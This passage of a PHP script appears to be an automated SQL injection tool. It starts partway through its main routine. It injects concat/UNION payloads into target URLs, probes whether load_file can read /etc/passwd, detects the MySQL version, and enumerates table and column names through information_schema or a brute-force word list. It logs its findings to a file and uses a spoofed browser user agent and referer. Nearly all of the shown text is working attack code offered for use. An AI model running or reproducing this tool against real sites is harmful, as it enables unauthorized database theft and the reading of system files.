        if(preg_match("/darkc0de:(.*?):darkc0de/", con_host("".str_replace("darkc0de", "".$string."+concat(0x6461726B63306465,0x3a,$val,0x3a,0x6461726B63306465)+", $url).""), $value)) {
            print "[-] $get: $value[1]\n";
            save_log('injector.txt', "[-] $get: $value[1]\r\n");
        }}
        print "[-] Testing load file...\n";
    $load = str_replace("darkc0de", "".$string."load_file(0x2f6574632f706173737764)", $rurl);
    if(preg_match("/root:x:/", con_host($load))) {
        print "[-] w00t w00t, you have permission to load file!\n";
        print "[-] URL: $load\n";
        save_log('injector.txt', "[-] w00t w00t, you have permission to load file!\r\n");
        save_log('injector.txt', "[-] URL: $load\r\n");
    } else {
        print "[-] No permission to load file :( \n";
    }
            if(preg_match("/darkc0de:5.(.*?):darkc0de/", con_host("".str_replace("darkc0de", "concat(0x6461726B63306465,0x3a,version(),0x3a,0x6461726B63306465)", $url).""), $value)) {
                print "[-] MySQL Server version is : 5.x\n";
                print "[-] Start extract the column and table...\n";
                print "[-] Table : Column\n";
                $url = str_replace("darkc0de", "concat(char(114,48,120,58),count(table_name),char(58,114,48,120))", $url);
                $url = str_replace($ending, "+from+information_schema.tables+where+table_schema=database()+$ending", $url);
                if(preg_match("/r0x:(.*?):r0x/", con_host($url), $totaltbl)) {
               	
               	print "[-] Total Table Found: ".$totaltbl[1]."\n";
               	save_log('injector.txt', "[-] Total Table Found: ".$totaltbl[1]."\r\n");
               	
               	for($i = 0; $i <= $totaltbl[1]; $i++) {
                  if(preg_match("/r0x:(.*?):r0x/", con_host(str_replace(array("darkc0de", "$ending"), array("concat(char(114,48,120,58),table_name,char(58,114,48,120))", "+from+information_schema.tables+where+table_schema=database()+limit+".$i.",1+$ending"), $rurl2)), $table_name)) {
                  	print "[-] Table: ".$table_name[1]."\n";
                  	save_log('injector.txt', "[-] Table: ".$table_name[1]."\r\n");
                  	if(preg_match("/r0x:(.*?):r0x/", con_host(str_replace(array("darkc0de", "$ending"), array("concat(char(114,48,120,58),count(column_name),char(58,114,48,120))", "+from+information_schema.columns+where+table_name=0x".HexValue($table_name[1])."+$ending"), $rurl2)), $totalclm)) {
                  		print "[-] Total Column in ".$table_name[1].": ".$totalclm[1]."\n";
                  		save_log('injector.txt', "[-] Total Column in ".$table_name[1].": ".$totalclm[1]."\r\n");
                  		for($a = 0; $a <= $totalclm[1]; $a++) {
                  			if(preg_match("/r0x:(.*?):r0x/", con_host(str_replace(array("darkc0de", "$ending"), array("concat(char(114,48,120,58),column_name,char(58,114,48,120))", "+from+information_schema.columns+where+table_name=0x".HexValue($table_name[1])."+limit+".$a.",1+$ending"), $rurl3)), $column_name)) {
                  				print "".$column_name[1].",";
                  				save_log('injector.txt', "".$column_name[1].",");
               			  }
                  		}
                  		print "\n";
                  		save_log('injector.txt', "\r\n");
                  	}
                  }
               	}
               	
                }

            } else {
                print "[-] MySQL Server version is : 4.x\n";
                print "[-] Start automatic column and table finder...\n";
                print "[-] This may take a few minutes or hours to finish\n";
                foreach($table_4 as $table) {
                    $i++;
                    $url = str_replace("concat(0x696E6A336374)", "concat(0x6461726B63306465)", $rurl);
                    $url = str_replace($ending, "+from+".$table."+$ending", $url);
                    if(preg_match("/darkc0de/", con_host($url))) {
                        print "[$i] Found Table : $table\n";
                        save_log('injector.txt', "[-] Found Table : $table\r\n");
                        print "[-] Finding column...\n";
                         foreach($column_4 as $column) {
                             $url = str_replace("darkc0de", "concat(0x6461726B63306465,0x3a,$column,0x3a,0x6461726B63306465)", $rurl);
                            $url = str_replace("$ending", "+from+".$table."+$ending", $url);
                            if(preg_match("/darkc0de:(.*?):darkc0de/", con_host($url))) {
                                print "[-] Found column: $column\n";
                                save_log('injector.txt', "[-] Found column: $column\r\n");
                            }
                         }
                         save_log('injector.txt', "\r\n");
                         print "[-] Done searching column inside $table table\n";
                        
                    }
                }
            }
    print "[-] Done\n";
    print "[-] See 'injector.txt' to see the log\n";
    exit;
}


function HexValue($text) {
     for($i = 0; $i < strlen($text); $i++) {
         $a .= dechex(ord($text[$i]));
     }
     return $a;
}

function wget() {
print "This is Wget\n";
      fwrite(STDOUT, "-Link : ");
        $link = trim(fgets(STDIN));
        $foo = system('wget',$link ,$output);
}

function Quit() {
    print "[+] Exit the program\n";
    exit;
}

function Get_Info($site) {
    if($info = con_host($site)) {
        preg_match("/Content-Type:(.+)/", $info, $type);
        preg_match("/Server:(.+)/", $info, $server);
        print "[-] $type[0]\n";
        print "[-] $server[0]\n";
        $ip = parse_url($site);
        print "[-] IP: ".gethostbyname($ip['host'])."\n";
    }
}

function con_host($host) {
    $ch = curl_init($host);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 200);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_REFERER, "http://google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9; Mozilla Firefox');
    $pg = curl_exec($ch);
    if($pg){
        return $pg;
    } else {
        return false;
    }
}

function find_link($site) {
    if($text = con_host($site)) {
    $find = "/href=[\"']?([^\"']+)?[\"']?/i";
    preg_match_all($find, $text, $links);
    
    foreach($links[1] as $link) {
        $a[] = $link;
    }
    return $a;
 }
}

function save_log($fname = '', $text = '') {
    $file = @fopen(dirname(__FILE__).'/'.$fname.'', 'a');
    $write = @fwrite($file, $text, '60000000');
    if($write) {
        return 1;
    } else {
        return 0;
    }
}

?>

